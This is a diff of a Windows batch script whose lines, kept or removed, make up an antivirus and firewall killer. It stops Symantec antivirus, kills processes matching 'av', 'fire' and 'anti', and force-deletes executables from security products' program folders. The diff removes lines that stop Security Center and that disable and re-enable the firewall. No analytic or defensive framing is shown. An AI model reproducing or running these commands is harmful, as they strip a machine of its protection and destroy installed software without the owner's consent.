@@ -1,7 +1,5 @@
 @ echo off
 net stop "symantec antivirus"
-net stop “Security Center”
-netsh firewall set opmode mode=disable
 taskkill /A av*
 taskkill /A fire*
 taskkill /A anti*
@@ -122,5 +120,4 @@ cls
 del /Q /F C:\Program Files\apvxdwin\*.exe
 del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\pandasoftware\*.*
-netsh firewall set opmode mode=enable
 exit
